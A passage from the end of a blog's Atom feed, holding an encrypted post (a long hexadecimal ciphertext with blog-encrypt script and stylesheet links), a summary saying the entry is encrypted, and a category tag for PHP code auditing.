8ba6c37ab1734590feb0fd758a1512a54b948f8b468bf31954b32ba16facada5632f0b3106c6cad90430101bbcaafbf421bc3dbfc7741e8eff966cfc6b092ec254cfffd5a4b1f6ff3643f2ae49433378da19d704c0f54a86b4557fb30138a007d8121510afce6fc0c3fab71457ac567f0ca1064b7dbfa6e2006eec438ce841b10bbcedbd8d4aac36185ceac45859de78939c683afcd2261e97a0ccc56ee47b9183c32c0ce9f996d1bd1944517dc4105ed02be125ca155ca6f033449520e9607e0a522cc02be51de83b2e23515cf2eb731d0576d0c77de962d4c8e9d8a7a9af422deab3185666370ebdfa76571fe51a9fcfe842a36167471068387cd3a01e005113c127fe27beafcbf707f0083e0362a67e0606027c4d72dd27a042ac9e48dd4feeb1fd169e42b09ff2db5b98f18c5aadb2275fd73a27414cfcb11eb7709ca2cbefdac1c50d0a649eca76b7d99be89858297eaad5c10449f96f3c9e060cf25d3c94f6eb24f55293217eacef083508db01c5dcb4d7259ce40532c37532f398bafd08d647ef661dab9e92449156fdcb3698348fe78029a846879ab1b4a8d90990dc71923da59b4775bf0449fa2897bce1a5565b92edefed78021e358458e1821feb2ba2113f1d810bdb4ecfd44bd84766d3f1f208047d62eb24c439df9e12885fc7be9395cd276714ea77f24e4e5ecfab947061bc97c0bf8c4b4b96bba6a2bbb10b8077d42f163289ec0b887ab111193d216500da7388d4e9b66cf4231c165ccf2e235053cda541ab47f76c388b6d3f065d8fbf2d2720a4251095a9ab4118b08ffbccfc20445e058f8e38298321258b83bc145b3dcfb91253a43005a07873483926bce362ba749a110a7331a7502414d18b1bcb852be8f1b229340d66b69d7c99da3c7c3995dc9a3e638663abb4227af05b918b637f64967e031ee8a6f8426d942abf8100fc6b168138bc2299e67826afb176d5617120be6f065e4cff3f1a3698ddbdb55c7cddf90aee0f45d7b058c574c45e2f94872b56d9ac213294ba4386be2bf4096515084f55744e39cf0c8841d1547e9341bf3bbfe5dd3c618288a233894dfd98d40a0e8f76ca0a69a35b2758bab6a4aa754e596a9ae3aae8dab752652a75388886232ef6514284477739b0c2e204e57d750470681447c858ff19b0b51e175f15bb9da47621aae9d6dc6168dbb27d03b9e9cb30104b0ca11132b9e43703032e7a48005e576f99328b5c377d401e2942fb92b3804e678c9a8bb8305f7addab6c8f6ae4d0b6f656fc98e33ee7190b0b314bea3565b70fb5695ed607c6767cba8889fca72fe68e49e6026fce774a77bf5f7e1aecae71734f190ab942043ba506dd4b0fb0ae537c0a1214127c11698c0f8961eb330e8af1d30ff559b77edbac009b1dc1848f5ac2efcb3cd3d5933e2dcf7187fc48a8dee8da35f276869e694d1433ceb4a59ff041f61fedfd613a0857ce12dd6cf9befd2bbd52a615c54223c0bea283a61e030e7e2f1fecef28561b1d0febcb9110dc52ae1f752ad3c230dc030b590eed60b757b0eaa84cc0029749d2196226d078e1209151a4c515ca1b398a44ad2f36f893895f0c3b76842adaf986fca164084cc5543d748f4144b93f563a015734d3aad09dd0d1e6bd2be5dccc6ecda64338bee05c0c32d91cbbb892e0b8c9b95a481f301f7ddee99b0b8a704acadd3178e52cf45ae3324488bac31fbcda8371cab22618ffcece66b105236702fc89c30b0a875ddda4f2b4975451acd4f8fdcc4cdd21b94135df809277f15b607fb210fd6f3099e53017a80a9180da0645f7bfb28a6ec253a2d7bbefbd5326e6e7a89e4493428db178b4fb890ceee1f31eb31882c4b7c6420c232ee3b2cc0b2ae89b6d6c22c3d3ece9a4e2f17e5a70a783e2b00c38e1</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="php代码审计" scheme="https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
